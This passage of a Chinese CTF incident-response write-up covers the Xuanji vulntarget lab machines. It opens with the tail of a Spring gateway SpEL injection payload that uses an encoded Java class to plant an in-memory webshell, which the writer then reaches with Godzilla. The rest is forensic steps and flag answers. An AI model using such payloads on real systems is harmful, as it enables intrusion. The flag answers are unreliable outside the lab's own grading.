6BbIAThJPuQBQAgDAAAy2AD46BhkGGQW2AFZXGQYZBLYAVlcssgAJAxAQtgBXtgAFVxkGtgBYVywqGQW2AFkEtgBNuABatgAFVyyyAAkQELYAW7YABVenAA1OLC22AEq2AAVXLLYAB7gAXLAAAQAIAKsArgAbAAMAbAAAAEoAEgAAAHIACAB0ABUAdQAgAHYALQB3AEAAeQBNAHoAVgB7AGgAfABwAH0AeAB+AIYAfwCMAIAAngCBAKsAhQCuAIMArwCEALgAhgBtAAAAUgAIAFYAVQCqAKsABQBoAEMArAB7AAYAFQCWAK0AZgADACAAiwCuAIQABACvAAkAogB5AAMAAADAAG4AbwAAAAAAwACLAK8AAQAIALgAsACxAAIAfQAAABYABP4AQAcAsgcAfwcAJfkAakIHAH4JAIAAAAAFAQCLEAAACACzAGoAAQBrAAAAMQACAAAAAAAVuwBdWbcAXrMAThJfswAEEmCzAAaxAAAAAQBsAAAACgACAAAAFwAKABgAAwC0AAAAAgC1AScAAAASAAIAyQAPASYGCQFyAXUBcwAZAPkAAAAMAAEA+gADAPsA/AD9'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/nnmm')}"
    }
        }],
      "uri": "http://example.com"
}
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164639530.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164642989.png)

接着使用哥斯拉连接，默认密码，连接地址：

```
/nnmm
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164653284.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164657181.png)

```
flag{Debian 4.19.260-1 (2022-09-29) x86_64 GNU/Linux}
```

黑客通过漏洞获取权限后获得的redis密码是多少，讲黑客通过漏洞获取权限后获得的redis密码作为 FLAG 提交 (请记录 REDIS 密码在 vulntarget03 环境中可以使用)

```
/home/spring-nacos >grep -Er 'redis' ./
```

然后一个个文件翻
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164708839.png)

```
flag{nbsg@123456}
```

# 应急响应-vulntarget-k-03

```
tar -czvf log.tar.gz ./*
```

通过本地 PC SSH到服务器并且找到黑客最后攻击的时间,将黑客最后攻击的时间作为 FLAG 提交(flag{432:M 18 Mar 2022 13:02:01.254});
写公钥的操作，那么找DB saved on disk最后的时间即可
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164718034.png)

```
flag{432:M 18 Mar 2024 12:03:09.854}
```

通过本地 PC SSH到服务器并且找到黑客ID 为多少,将黑客ID 作为 FLAG 提交;
一般就是看私钥了

```
/root/.ssh/authorized_keys
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164740077.png)




```
flag{penguin}
```

通过本地 PC SSH到服务器并且找到黑客绕过防火墙检测所使用工具的 KEY,将找到的 KEY 作为 FLAG 提交;

```
find / -type f -newermt 2024-3-18 ! -newermt 2024-3-19
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164743959.png)

看到下面目录

```
/opt/.a/
```

看py文件，key是输入的参数
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164754097.png)

再看start.sh
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164800420.png)

得到key

```
flag{edisec-penguin}
```

通过本地 PC SSH到服务器并且找到黑客绕过防火墙检测所使用工具反弹 Shell 的 ip,将找到对应的 IP 作为 FLAG 提交;
看上图

```
flag{14.14.14.14}
```

# 参考

[玄机-应急响应-Linux日志分析](https://blog.cyberparterre.top/archives/XUANJI-LinuxLogAnalysis)

[【玄机】日志分析-apache日志分析-CSDN博客](https://blog.csdn.net/qq_40923603/article/details/136536285)

[应急响应之Linux下进程隐藏 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/258510.html)

[玄机-Wordpress-应急响应-WP_玄机应急响应-CSDN博客](https://blog.csdn.net/weixin_42467891/article/details/136251787)

[玄机靶场-蚂蚁爱上树-CSDN博客](https://blog.csdn.net/weixin_42467891/article/details/136249402)

[【永久开源】vulntarget-m-攻防应急靶场write up](https://mp.weixin.qq.com/s/YxZqgd6Hjz3QcYCPAGpAGg)

[APT入侵应急响应靶场搭建 & 攻击过程](https://mp.weixin.qq.com/s/p1KNDU84PXOv-fqo8TfHNQ)

[记一个真实的应急响应案例（4）algo挖矿病毒事件](https://mp.weixin.qq.com/s/k2PlLo24a_Fnnql7n_7STg)

[【实景挑战 | 题解】应急靶机01: Where-1S-tHe-Hacker详细题解](https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw)

